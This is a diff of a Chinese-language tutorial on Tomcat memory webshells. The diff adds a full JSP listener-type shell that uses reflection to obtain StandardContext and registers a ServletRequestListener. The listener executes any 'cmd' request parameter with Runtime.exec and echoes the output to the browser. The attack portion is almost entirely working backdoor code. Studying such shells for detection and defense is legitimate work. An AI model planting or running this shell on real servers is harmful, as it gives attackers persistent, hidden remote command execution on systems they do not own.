@@ -257,6 +257,63 @@ try {
 ---
 
 ok最终调用 `standardContext`的 `addApplicationEventListener()`添加我们自己的listener
+
+```jsp
+<%@ page import="java.lang.reflect.Field" %>  
+<%@ page import="java.lang.reflect.Method" %>  
+<%@ page import="java.io.InputStream" %>  
+<%@ page import="org.apache.catalina.core.ApplicationContext" %>  
+<%@ page import="org.apache.catalina.core.StandardContext" %><%--  
+  Created by IntelliJ IDEA.  User: point  Date: 2026/1/6  Time: 21:29  To change this template use File | Settings | File Templates.--%>  
+<%@ page contentType="text/html;charset=UTF-8" language="java" %>  
+<%! class ListenerShell implements ServletRequestListener{  
+    @Override  
+    public void requestDestroyed(ServletRequestEvent sre) {  
+  
+    }  
+    @Override  
+    public void requestInitialized(ServletRequestEvent sre) {  
+        String cmd = sre.getServletRequest().getParameter("cmd");//拿到传参  
+        ServletRequest requestfacade = sre.getServletRequest();//拿到requestfacade类  
+        try {  
+            Field requestField = requestfacade.getClass().getDeclaredField("request");  
+            requestField.setAccessible(true);  
+            Object ObjectRequest = requestField.get(requestfacade);//拿到存放请求内容的对象  
+  
+            Method getResponseMethod = ObjectRequest.getClass().getMethod("getResponse");//拿其中的回复对象，为了回显  
+            Object ObjectResponse = getResponseMethod.invoke(ObjectRequest);  
+            //再获取ObjectResponse的 Writer 以便写出数据  
+            java.io.PrintWriter writer = (java.io.PrintWriter) ObjectResponse.getClass().getMethod("getWriter").invoke(ObjectResponse);  
+            //命令执行  
+            if (cmd != null) {  
+                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();  
+                java.util.Scanner s = new java.util.Scanner(inputStream).useDelimiter("\\A");  
+                String output = s.hasNext() ? s.next() : "";  
+  
+                // 6. 使用我们“偷”出来的 writer 将结果写回浏览器  
+                writer.write(output);  
+                writer.flush();            }  
+        } catch (Exception e) {  
+            throw new RuntimeException(e);  
+        }    }}  
+%>  
+<%  
+    ServletContext servletContext = request.getSession().getServletContext();//先通过session拿到ServletContext ，本质是ApplicationContextFacade的马甲类  
+  
+    //通过反射访问私有属性context，拿到了ApplicationContext  
+    Field appctx = servletContext.getClass().getDeclaredField("context");  
+    appctx.setAccessible(true);  
+    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);  
+    //再次反射拿StandardContext  
+    Field stdctx = applicationContext.getClass().getDeclaredField("context");  
+    stdctx.setAccessible(true);  
+    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);  
+    ListenerShell listenerShell = new ListenerShell();  
+    standardContext.addApplicationEventListener(listenerShell);%>
+```
+
+
+
 ```jsp
 <%@ page import="java.lang.reflect.Field" %>  
 <%@ page import="java.lang.reflect.Method" %>  
